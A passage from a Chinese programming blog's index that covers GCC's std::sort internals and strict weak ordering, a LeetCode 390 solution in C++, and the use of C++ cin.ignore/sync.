__i)</code>区间的元素整体后移一位，再将<code>__i</code>位置的元素插入到原先<code>__first</code>位置处。这样就避免了从<code>__i</code>位置一路比较到<code>__first</code>位置，才找到<code>__i</code>在前缀序列中的待插入位置，即节省了比较开销。</p></li><li><p>如果否，则需要在<code>(__first, __i)</code>区间寻找合适的位置<code>__pos</code>，使得<code>*(__pos-1) &lt;= *__i &lt; *__pos</code></p><p>这个部分是由<code>__unguarded_linear_insert</code>函数完成，这个函数前面也有<strong><code>__unguarded</code></strong>前缀，<strong>也是没有边界检测的意思</strong>。</p></li></ul><p><code>__insertion_sort</code>函数，整个代码解释如下。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">_RandomAccessIterator</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">_Compare</span><span class="token operator">&gt;</span><span class="token keyword">void</span><span class="token function">__insertion_sort</span><span class="token punctuation">(</span>_RandomAccessIterator __first<span class="token punctuation">,</span>                 _RandomAccessIterator __last<span class="token punctuation">,</span>                  _Compare __comp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>__first <span class="token operator">==</span> __last<span class="token punctuation">)</span> <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token comment">/*** 下面要将 (fist, last) 区间的每个元素 __i 都插入到前缀序列中 ***/</span>      <span class="token keyword">for</span> <span class="token punctuation">(</span>_RandomAccessIterator __i <span class="token operator">=</span> __first <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">;</span> __i <span class="token operator">!=</span> __last<span class="token punctuation">;</span> <span class="token operator">++</span>__i<span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token comment">/* case 1:  *__i &lt; *__first 时，则将 [__first, __i)区间后移，     *          再将 *__i 插入到原先 __first 位置     */</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__comp</span><span class="token punctuation">(</span>__i<span class="token punctuation">,</span> __first<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>      <span class="token keyword">auto</span> __val <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token function">move</span><span class="token punctuation">(</span><span class="token operator">*</span>__i<span class="token punctuation">)</span><span class="token punctuation">;</span>              <span class="token comment">// 待插入的值</span>      std<span class="token double-colon punctuation">::</span><span class="token function">move_backward</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __i<span class="token punctuation">,</span> __i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 将 [_first, _i) 区间的元素朝后移动一个位置</span>      <span class="token operator">*</span>__first <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token function">move</span><span class="token punctuation">(</span>__val<span class="token punctuation">)</span><span class="token punctuation">;</span>               <span class="token comment">// 将 __i 位置处的值移动到 __first 处</span>    <span class="token punctuation">}</span>    <span class="token keyword">else</span>    <span class="token punctuation">{</span>      <span class="token comment">/* case 2:  *__i &gt;= *__fist 时，       *          此时需要在有序前缀 (fist，_i)区间中，寻找合适的位置再插入       */</span>      std<span class="token double-colon punctuation">::</span><span class="token function">__unguarded_linear_insert</span><span class="token punctuation">(</span>__i<span class="token punctuation">,</span> __gnu_cxx<span class="token double-colon punctuation">::</span>__ops<span class="token double-colon punctuation">::</span><span class="token function">__val_comp_iter</span><span class="token punctuation">(</span>__comp<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token punctuation">}</span> <span class="token comment">// for-end</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="std__unguarded_linear_insert">std::__unguarded_linear_insert</h5><p><code>__unguarded_linear_insert</code>函数，在有序前缀<code>(__first, __last)</code>中寻找合适的位置<code>__pos</code>，将<code>__i</code>位置的值插入到<code>__pos</code>处。</p><p>那什么叫合适的位置呢？</p><p>从<code>__i-1</code>的位置开始遍历，第一个出现<strong>逆序对</strong>的位置<code>__pos</code>，即：</p><ul><li><code>__pos &lt; __i</code> ，且</li><li><code>*(__pos-1) &lt;= *__i &lt; *__pos</code>。</li></ul><p>当找到这么个位置，需要将<code>[__pos, __i)</code>区间的元素，后移一位，然后将<code>__i</code>位置的元素插入到<code>__pos</code>。为了实现这一步，STL在<code>__unguarded_linear_insert</code>函数中，边遍历、边把当前位置的元素向后移动。</p><p>下面是<code>__unguarded_linear_insert</code>函数的源码分析。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">template</span> <span class="token operator">&lt;</span><span class="token keyword">typename</span> <span class="token class-name">_RandomAccessIterator</span><span class="token punctuation">,</span> <span class="token keyword">typename</span> <span class="token class-name">_Compare</span><span class="token operator">&gt;</span><span class="token keyword">void</span><span class="token function">__unguarded_linear_insert</span><span class="token punctuation">(</span>_RandomAccessIterator __last<span class="token punctuation">,</span> _Compare __comp<span class="token punctuation">)</span><span class="token punctuation">{</span>  <span class="token keyword">auto</span> __val <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token function">move</span><span class="token punctuation">(</span><span class="token operator">*</span>__last<span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 当前待插入的值 __val</span>  _RandomAccessIterator __next <span class="token operator">=</span> __last<span class="token punctuation">;</span>   <span class="token operator">--</span>__next<span class="token punctuation">;</span>                          <span class="token comment">// 需要在有序前缀区间 (first, last)中遍历，因此开始遍历的位置需要 --next</span>      <span class="token comment">/* __comp(__val, __next) 为false时，表示出现逆序，  *  __next 指向当前遍历位置  *  __last 用于指向 __next 的上一个位置  */</span>  <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">__comp</span><span class="token punctuation">(</span>__val<span class="token punctuation">,</span> __next<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>    <span class="token comment">/** 下面是将当前遍历位置 __next 存储到 __last ***/</span>          <span class="token operator">*</span>__last <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token function">move</span><span class="token punctuation">(</span><span class="token operator">*</span>__next<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">// 将当前位置的值后移动一位</span>          __last <span class="token operator">=</span> __next<span class="token punctuation">;</span>               <span class="token comment">//  __last 前移</span>    <span class="token operator">--</span>__next<span class="token punctuation">;</span>                      <span class="token comment">//  __next 前移</span>  <span class="token punctuation">}</span>    <span class="token comment">/* 以上while循环，相当于将 [__last, __i) 区间的元素，后移动了一位，   * 现在找到合适位置，此时：*__next &lt;= val &amp;&amp; val &lt; *last   * 因此，将 val 插入到上一个节点位置   */</span>  <span class="token operator">*</span>__last <span class="token operator">=</span> std<span class="token double-colon punctuation">::</span><span class="token function">move</span><span class="token punctuation">(</span>__val<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>__unguarded_linear_insert</code> 为啥能不用检测是否越界？</p><p>因为，之所以能进入<code>__unguarded_linear_insert</code>函数，是因为在<code>__insertion_sort</code>函数中有了<code>__i &gt;= __first</code>。因此在此函数中，再不济，<code>while(__comp(__val, __next))</code>也会在<code>__first</code>后一个位置停下来，最终插入在<code>___first+1</code>处。</p><p>免去边界检测，可以实现一定程度上的优化（STL对性能真的是锱铢必较）。</p><p>在这，你可能在想这个<code>__unguarded_partition</code>函数，会存在之前在<code>__unguarded_partition</code>中出现的BUG吗？</p><p>理论上是应该要出BUG的，这也是符合CPP标准，但是从上面的GCC的源码实现可以看出，GCC下不会出现BUG。</p><p>下面的代码在MSVC中运行被中止，而GCC下是可以正常运行：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;vector&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;algorithm&gt;</span></span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token keyword">const</span><span class="token operator">*</span> argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    std<span class="token double-colon punctuation">::</span>vector<span class="token operator">&lt;</span><span class="token keyword">int</span><span class="token operator">&gt;</span> vec<span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">}</span><span class="token punctuation">;</span>        std<span class="token double-colon punctuation">::</span><span class="token function">sort</span><span class="token punctuation">(</span>vec<span class="token punctuation">.</span><span class="token function">begin</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> vec<span class="token punctuation">.</span><span class="token function">end</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>              <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> lhs<span class="token punctuation">,</span> <span class="token keyword">const</span> <span class="token keyword">int</span><span class="token operator">&amp;</span> rhs<span class="token punctuation">)</span>              <span class="token punctuation">{</span>                  <span class="token keyword">return</span> lhs <span class="token operator">&lt;=</span> rhs<span class="token punctuation">;</span>              <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因为，在GCC下，会进入<code>__insertion_sort</code>函数的<code>if (__comp(__i, __first))</code>条件分支中，不断地将<code>[__first, __i)</code>区间元素后移动一位，避免了报错。</p><p>尽管GCC避免了报错，但实际上却不符合CPP标准。</p><p>因此，在书写自定义比较器算法时，要使其符合<strong>「严格弱序关系」</strong>，代码才具有移植性。</p><p>到此，<code>std::sort</code>的整个运行流程大致分析完毕。</p><h3 id="什么是严格弱序">什么是严格弱序</h3><p>严格弱序比较这个概念听起来就比较抽象，生涩难懂，讲明白就更加不容易了。看了多份资料和相关书籍的部分章节，下面就来详细谈谈这个【严格弱序比较】。谈到这个概念就不得不先讲两个比较重要的概念【小于比较（LessThancomparable）】和【严格弱序（strict weak ordering）】。</p><h4 id="小于比较lessthan-comparable">小于比较（LessThancomparable）</h4><p>这里可能有个疑问这么多种比较原则，怎么小于比较就那么重要了？先来回答一下这个问题，对于比较本身而言有：小于，大于，小于等于，大于等于，等于，这个大家都知道。但对于这五种比较可以提炼出一个基础的比较，那就是【小于比较】（当然也可以是大于，这里就以小于为例）其他的比较都可以用小于比较进行等价。</p><p>大于：<code>x &gt; y    &lt;=&gt;   y &lt; x</code></p><p>大于等于：<code>x &gt;= y  &lt;=&gt;  !(x &lt; y)</code></p><p>小于等于：<code>x &lt;= y  &lt;=&gt;  !(y &lt; x)</code></p><p>等于：<code>!(x&lt;y) &amp;&amp; !(y&lt;x)</code></p><h4 id="严格弱序strict-weak-ordering">严格弱序（strict weakordering）】</h4><p>严格弱序的正式定义：如果两个元素具备任何一个元素都不小于另一个元素的性质，那么就视为它们是具备某种程度之等价关系是合理的。公式：<code>!(x&lt;y) &amp;&amp; !(y&lt;x)</code>,广义上<code>!op(x,y) &amp;&amp; !op(y,x)</code> （<code>op(x,y)</code>表示比较<code>x</code>和<code>y</code>）。光看定义需要理解一阵子，不过看了公式应该就比较好理解了，严格弱序就是对等价做了个定义，满足这个条件的既是等价。</p><h4 id="严格弱序比较strick-weakly-comparable">严格弱序比较（strickweakly comparable）</h4><p>前面铺垫了这么多，是时候进入主题了。</p><p>所谓严格弱序比较，就是满足【小于比较】和【严格弱序】这两个条件，才能称之为严格弱序比较。</p><p>举个反例：如果我们把比较定义为【小于等于】出现什么问题呢？如果x等于y，那么根据等价的定义<code>!op(x,y) &amp;&amp; !op(y,x)，=&gt; !true &amp;&amp; !true =&gt; false</code>。明明相等，最后推导出来的结果却是不等，这就错了。</p><h3 id="stl-为什么要设计严格弱序">STL 为什么要设计严格弱序</h3><p>STL为何要给它的用户们设置这样一个关卡，给他们找麻烦呢，但其实细想，这个设计是很绝妙的。</p><ul><li>对于sort中排序函数，如果不遵守严格弱序，那么在根据pivot调整元素顺序时，while(__comp(*__first, __pivot)) ++__first;中++__first会越界。导致程序崩溃。</li></ul><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">__comp</span><span class="token punctuation">(</span><span class="token operator">*</span>__first<span class="token punctuation">,</span> __pivot<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token operator">++</span>__first<span class="token punctuation">;</span>    <span class="token operator">--</span>__last<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">__comp</span><span class="token punctuation">(</span>__pivot<span class="token punctuation">,</span> <span class="token operator">*</span>__last<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token operator">--</span>__last<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>__first <span class="token operator">&lt;</span> __last<span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> __first<span class="token punctuation">;</span>    std<span class="token double-colon punctuation">::</span><span class="token function">iter_swap</span><span class="token punctuation">(</span>__first<span class="token punctuation">,</span> __last<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token operator">++</span>__first<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>对于有序且无重复元素的关联容器（例如，set，map），向里面插入两个相同元素时，如果定义的比较函数不是严格弱序的话（而是在&lt;= 情况下，返回true），由于stl判断相等是使用的 !Cmp(a,b) &amp;&amp;!Cmp(b,a)，那么当a 和b相等时，stl判断相等会返回false，被认为这两个元素值不同的，这是错误的。所以比较函数需要遵守严格弱序原则，换句话说，永远让比较函数对相等的值返回false。</li><li>对于有序且有重复元素的关联容器（例如，multiset，multimap），可能让人产生一种错觉：无重复元素的关联容器是要求严格弱序的，那么有重复元素的关联容器是否可以用小于等于来比较呢？这是错误的。multiset和multimap如果用小于等于来比较，那么容器就会认为值相等的元素不是等价的，这和容器的本意是背道而驰的，它们的本意是值相等=&gt; 被认为是等价的 =&gt;允许插入。被认为是不等价的虽然也可以插入（如下图所示，10A，10B都能插入），但是在调用equal_range获取等价元素（注意这里不是值相等的元素）的范围时候，值相等的元素会不在这个范围内，所以值相等却不等价这是做法是错误的。很多人都认为c++很难，它的难其中一部分原因在于它太过于灵活了，我们可以灵活构造容器，但是我们要考虑这样设计是否合理。</li></ul><p>比方说你在进行数据排序的时候，想要写一个自定义的排序方法，你可以重写大于、小于、大于等于或者是 小于等于，如果你是重写的 &gt;=（非严格弱序）</p><p><code>a &gt;= b , b &gt;= a</code>通过两个对象交换位置，你可以判断出它们之间的 <code>&gt;=</code> 和<code>&lt;=</code>关系，但你无法判断这两个数是否相等，是不是这样的？</p><p>但如果你重写的是 <code>&gt;</code>（严格弱序），情况就有所不同了</p><p><code>a &gt; b</code> 结果为 <code>true</code>，则大小已定；</p><p>如果结果为<code>false</code>，则可知 <code>a &lt;= b</code>，接着判断<code>b &gt; a</code>，（操作符不变，因为你就提供了一个操作符，交换比较对象的位置），结果为<code>true</code>，则大小已定，若是结果为<code>false</code>，则结果也很显然，那就是<code>a == b</code></p><p>严格弱序让你实现了，只要传入一个操作符，你就可以知道两个操作数之间的大小关系、是否相等关系，这是非严格弱序所不能实现的。因为C++有很多地方对相同元素是敏感的，就比如说不允许有重复元素出现的set容器，如果把相同元素识别成不同或者根本识别不出来，那是很不恰当的。</p><p>对于一个类型，无论是默认类型，还是自定义的类型的变量，都会经常使用到【比较】。例如，单纯的比较同一个类型的两个变量的大小、set和multiset等容器插入数据时和容器中已有数据做比较来决定是否插入和放入的位置，还有本文的主题在排序（sort）的时的比较。</p><p>References:</p><blockquote><p>https://mp.weixin.qq.com/s?__biz=MzkyMjIxMzIxNA==&amp;mid=2247486922&amp;idx=1&amp;sn=5d8336a50d0fe7ebdc0c13e9dc8816cf</p><p>https://blog.csdn.net/River_Lethe/article/details/78618788</p><p>https://blog.csdn.net/llz62378/article/details/88937139</p><p>https://en.wikipedia.org/wiki/Weak_ordering</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> C/C++ </tag>
            
            <tag> 编程 </tag>
            
            <tag> 数学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Leetcode.390 Elimination Game</title>
      <link href="/2022/01/05/leetcode-390-elimination-game/"/>
      <url>/2022/01/05/leetcode-390-elimination-game/</url>
      
        <content type="html"><![CDATA[<h1 id="elimination-game"><a href="https://leetcode.com/problems/elimination-game/">390. EliminationGame</a></h1><h1 id="思路">思路</h1><p>给定<span class="math inline">\(1,2,...,n\)</span>，然后按照题目的规则不断删除一些数，求最后剩下的数。</p><h2 id="思路一">思路一</h2><p>我首先想到的就是按照题目的规则进行模拟，但不要纯暴力模拟，那样肯定超时，还是要根据其中一些规律。有一个很容易发现的规律：每次剩下的数都是一个等差数列，而且等差分别为<span class="math inline">\(1, 2, 4...\)</span>。为此我们可以用一个循环，每次记录剩下的数的第一个数start和最后一个数<span class="math inline">\(end\)</span>以及等差<span class="math inline">\(diff\)</span>，不断循环直到 <span class="math inline">\(start = end\)</span> 。</p><h2 id="思路二">思路二</h2><p>一个代码很简洁的递归解法：</p><p>我们设 *<code>ML(n)</code>代表第一次是从左往后的情况下最终剩下的数，这就是要我们写的函数；* <code>MR(n)</code>代表第一次是从右往左的情况下最终剩下的数；</p><p>注意我们第一次将所有奇数都删除了，将剩下所有偶数都除2就得到序列<span class="math inline">\(1,2,...,\frac n2\)</span>。即我们有<code>ML(n) = 2 * MR(n/2)</code>。又因为我们有<code>ML(n) + MR(n) = n + 1</code>（证明见<a href="https://leetcode.com/problems/elimination-game/discuss/87128/C-1-line-solution-with-explanation">讨论区</a>），所以<code>ML(n) = 2 * (n/2 + 1 - ML(n/2))</code>。根据这个公式我们就可以写出递归函数了，就一行。</p><h1 id="c">C++</h1><h2 id="思路一-1">思路一</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">lastRemaining</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> start <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">,</span> end <span class="token operator">=</span> n<span class="token punctuation">,</span> diff <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token comment">// i记录循环的次数</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>start <span class="token operator">!=</span> end<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token punctuation">(</span>i <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span> <span class="token comment">// 从前往后, start可直接写出</span>                start <span class="token operator">+=</span> diff<span class="token punctuation">;</span>                 diff <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>                end <span class="token operator">=</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span> <span class="token operator">/</span> diff <span class="token operator">*</span> diff <span class="token operator">+</span> start<span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">else</span><span class="token punctuation">{</span> <span class="token comment">// 从后往前, end可直接写出</span>                end <span class="token operator">-=</span> diff<span class="token punctuation">;</span>                diff <span class="token operator">&lt;&lt;=</span> <span class="token number">1</span><span class="token punctuation">;</span>                start <span class="token operator">=</span> end <span class="token operator">-</span> <span class="token punctuation">(</span>end <span class="token operator">-</span> start<span class="token punctuation">)</span> <span class="token operator">/</span> diff <span class="token operator">*</span> diff<span class="token punctuation">;</span>            <span class="token punctuation">}</span>                        i<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">return</span> start<span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="思路二-1">思路二</h2><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">class</span> <span class="token class-name">Solution</span> <span class="token punctuation">{</span><span class="token keyword">public</span><span class="token operator">:</span>    <span class="token keyword">int</span> <span class="token function">lastRemaining</span><span class="token punctuation">(</span><span class="token keyword">int</span> n<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">return</span> n <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">?</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">2</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">+</span> n <span class="token operator">/</span> <span class="token number">2</span> <span class="token operator">-</span> <span class="token function">lastRemaining</span><span class="token punctuation">(</span>n <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> ACM </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> 编程 </tag>
            
            <tag> LeetCode </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C++ STL输入功能</title>
      <link href="/2022/01/05/c-stl-shu-ru-gong-neng/"/>
      <url>/2022/01/05/c-stl-shu-ru-gong-neng/</url>
      
        <content type="html"><![CDATA[<h3 id="cin.clear-与-cin.sync"><code>cin.clear()</code> 与<code>cin.sync()</code></h3><p><code>cin.clear()</code> 用来更改cin的状态标示符</p><p><code>cin.sync()</code> 用来清除缓存区的数据流</p><p>如果标示符没有改变那么即使清除了数据流也无法输入，<strong>所以两个要联合起来使用</strong></p><h3 id="cin.ignoreach"><code>cin.ignore(a,ch)</code></h3><p>输入流（cin）中提取字符，提取的字符被忽略（ignore），不被使用。每抛弃一个字符，它都要计数和比较字符：如果计数值达到a或者被抛弃的字符是ch，则cin.ignore()函数执行终止；否则，它继续等待。</p><p>它的一个常用功能就是用来清除以回车结束的输入缓冲区的内容，消除上一次输入对下一次输入的影响。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">std<span class="token double-colon punctuation">::</span>cin<span class="token punctuation">.</span><span class="token function">ignore</span><span class="token punctuation">(</span><span class="token class-name">numeric_limits</span><span class="token operator">&lt;</span>streamsize<span class="token operator">&gt;</span><span class="token double-colon punctuation">::</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token char">'\n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>示例代码：</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;iostream&gt;</span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span><span class="token string">&lt;vector&gt;</span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>   <span class="token keyword">int</span> x<span class="token punctuation">;</span>   <span class="token keyword">char</span> str<span class="token punctuation">[</span><span class="token number">80</span><span class="token punctuation">]</span><span class="token punctuation">;</span>   cout <span class="token operator">&lt;&lt;</span> <span class="token string">"Enter a number and a string:\n"</span><span class="token punctuation">;</span>   cin <span class="token operator">&gt;&gt;</span> x<span class="token punctuation">;</span>   cin<span class="token punctuation">.</span><span class="token function">getline</span><span class="token punctuation">(</span>str<span class="token punctuation">,</span><span class="token number">80</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//take a string</span>   cout <span class="token operator">&lt;&lt;</span> <span class="token string">"You have entered:\n"</span><span class="token punctuation">;</span>   cout <span class="token operator">&lt;&lt;</span> x <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>   cout <span class="token operator">&lt;&lt;</span> str <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span>   <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="输入">输入</h4><pre class="line-numbers language-none"><code class="language-none">8hahaha<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="输出">输出</h4><pre class="line-numbers language-none"><code class="language-none">Enter a number and a string:8You have entered:8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>整数和字符串有两个<code>cin</code>语句，但只取数字。当我们按下回车键时，它会跳过<code>getline()</code>函数而不接受任何输入。有时它可以接受输入但在整数变量的缓冲区内，所以我们看不到字符串输出。</p><p>现在为了解决这个问题，我们将使用 <code>cin.ignore()</code> 函数。</p><h3 id="cin.sync和cin.ignor的比较"><code>cin.sync()</code>和<code>cin.ignor()</code>的比较</h3><p>sync()的作用就是清除输入缓冲区。成功时返回0，失败时badbit会置位，函数返回-1.另外，对于绑定了输出的输入流，调用sync()，还会刷新输出缓冲区。</p><p>但由于程序运行时并不总是知道外部输入的进度，很难控制是不是全部清除输入缓冲区的内容。通常我们有可能只是希望放弃输入缓冲区中的一部分，而不是全部。比如清除掉当前行、或者清除掉行尾的换行符等等。但要是缓冲区中已经有了下一行的内容，这部分可能是我们想保留的。这个时候最好不要用sync()。可以考虑用ignore函数代替。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">cin<span class="token punctuation">.</span><span class="token function">ignore</span><span class="token punctuation">(</span><span class="token class-name">numeric_limits</span><span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>streamsize<span class="token operator">&gt;</span><span class="token double-colon punctuation">::</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token char">' /n'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//清除当前行</span>cin<span class="token punctuation">.</span><span class="token function">ignore</span><span class="token punctuation">(</span><span class="token class-name">numeric_limits</span><span class="token operator">&lt;</span>std<span class="token double-colon punctuation">::</span>streamsize<span class="token operator">&gt;</span><span class="token double-colon punctuation">::</span><span class="token function">max</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       <span class="token comment">//清除cin里所有内容</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>不要被长长的名字吓倒，<code>numeric_limits\&lt;std::streamsize\&gt;::max()</code>不过是<code>climits</code>头文件定义的流使用的最大值，你也可以用一个足够大的整数代替它。</p><p>使用<code>ignore</code>显然能比<code>sync()</code>更精确控制缓冲区。</p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ACM </tag>
            
            <tag> C/C++ </tag>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Conda环境配置优化</title>
      <link href="/2022/01/04/conda-huan-jing-pei-zhi-you-hua/"/>
      <url>/2022/01/04/conda-huan-jing-pei-zhi-you-hua/</url>
      
